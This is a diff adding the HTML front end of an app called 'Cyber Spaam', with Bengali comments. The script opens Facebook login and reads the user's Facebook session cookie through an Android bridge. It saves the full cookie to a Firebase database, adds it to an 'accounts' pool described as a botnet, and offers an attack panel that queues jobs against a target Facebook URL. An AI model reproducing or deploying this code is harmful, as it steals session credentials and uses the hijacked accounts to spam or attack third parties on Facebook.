@@ -1,0 +1,130 @@
+<!-- language: HTML, file: www/index.html -->
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Cyber Spaam</title>
+  <style>
+    body { font-family: sans-serif; background-color: #0a0a0a; color: #00ff41; text-align: center; margin: 0; padding: 20px; }
+    .container { max-width: 400px; margin: 40px auto; background: #111; padding: 20px; border-radius: 10px; border: 1px solid #00ff41; }
+    h1 { font-size: 24px; cursor: pointer; text-shadow: 0 0 10px #00ff41; }
+    input { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #333; color: #00ff41; border-radius: 5px; }
+    button { width: 100%; padding: 12px; background: #1877F2; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 16px; }
+    .danger { background: #ff3333; color: #fff; }
+    .hidden { display: none !important; }
+    .box { border: 1px solid #333; padding: 15px; margin-bottom: 15px; border-radius: 5px; }
+  </style>
+</head>
+<body>
+
+  <div id="loginPanel" class="container">
+    <h1 id="appLogo">CYBER SPAAM</h1>
+    <p>Login to Attack</p>
+    
+    <!-- ফেসবুক লগইন পেজ ওপেন করার বাটন -->
+    <button onclick="openFacebookLogin()" style="background:#1877F2;">1. Login to Facebook</button>
+    
+    <!-- লগইন শেষে কুকি রিড করার বাটন -->
+    <button onclick="grabCookieAndSave()" style="background:#00cc33; margin-top:10px;">2. I Logged In, Connect App</button>
+    <div id="loginStatus" style="color:red; margin-top:10px;"></div>
+  </div>
+
+  <div id="attackPanel" class="container hidden">
+    <h1>ATTACK PANEL</h1>
+    <p>Points Remaining: <span id="userPoints" style="color:yellow; font-weight:bold;">0</span></p>
+    <input type="url" id="targetUrl" placeholder="https://facebook.com/target">
+    <button class="danger" onclick="launchAttack()">EXECUTE (-1 Point)</button>
+    <div id="status" style="margin-top:15px; color:yellow;"></div>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getDatabase, ref, push, set, get, child, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+    const firebaseConfig = { /* তোমার ফায়ারবেস কনফিগ এখানে বসাও */ };
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    let currentUserCookie = "";
+    let currentUserPoints = 0;
+
+    // ১. ফেসবুক লগইন ওপেন করা
+    window.openFacebookLogin = function() {
+      // ইন্টারনালি ফেসবুক পেজ ওপেন হবে (ক্যাপাসিটর ওয়েবভিউতে)
+      window.location.href = "https://m.facebook.com/login";
+    }
+
+    // ২. কুকি রিড করে ফায়ারবেসে সেভ করা
+    window.grabCookieAndSave = async function() {
+      const status = document.getElementById('loginStatus');
+      
+      // অ্যান্ড্রয়েড নেটিভ কোড থেকে কুকি নেওয়া
+      let cookie = "";
+      if (window.AndroidCookieManager && window.AndroidCookieManager.getFbCookie) {
+        cookie = window.AndroidCookieManager.getFbCookie();
+      } else {
+        return status.innerText = "❌ WebView Error. Are you using the APK?";
+      }
+
+      if (!cookie || !cookie.includes('c_user')) {
+        return status.innerText = "❌ Login failed or no cookie found.";
+      }
+
+      status.innerText = "Connecting to Botnet...";
+      
+      try {
+        const dbRef = ref(db);
+        const userKey = btoa(cookie.substring(0, 15)); 
+        
+        const snapshot = await get(child(dbRef, `users/${userKey}`));
+        let points = 0;
+
+        if (snapshot.exists()) {
+          points = snapshot.val().points || 0;
+        } else {
+          await set(ref(db, `users/${userKey}`), { cookie: cookie, points: 0 });
+        }
+
+        // বোটনেট পুলে অ্যাড করা
+        const accRef = ref(db, 'accounts');
+        await set(push(accRef), { cookie: cookie });
+
+        currentUserCookie = cookie;
+        currentUserPoints = points;
+        
+        document.getElementById('userPoints').innerText = points;
+        document.getElementById('loginPanel').classList.add('hidden');
+        document.getElementById('attackPanel').classList.remove('hidden');
+        
+        // আবার অ্যাপে ফিরে আসা
+        window.location.href = "index.html"; 
+
+      } catch (e) { status.innerText = "DB Error: " + e.message; }
+    }
+
+    window.launchAttack = async function() {
+      const url = document.getElementById('targetUrl').value.trim();
+      const status = document.getElementById('status');
+      
+      if (!url.includes('facebook.com')) return status.innerText = "❌ Invalid URL";
+      if (currentUserPoints <= 0) return status.innerText = "❌ Not enough points!";
+
+      status.innerText = "⚡ Deploying Botnet...";
+      try {
+        const userKey = btoa(currentUserCookie.substring(0, 15));
+        currentUserPoints--;
+        await update(ref(db, `users/${userKey}`), { points: currentUserPoints });
+        document.getElementById('userPoints').innerText = currentUserPoints;
+
+        await set(push(ref(db, 'jobs')), { 
+          targetUrl: url, status: "pending", createdAt: Date.now() 
+        });
+
+        status.innerText = "✅ Attack Deployed!";
+        document.getElementById('targetUrl').value = '';
+      } catch (e) { status.innerText = "❌ Error: " + e.message; }
+    }
+  </script>
+</body>
+  </html>
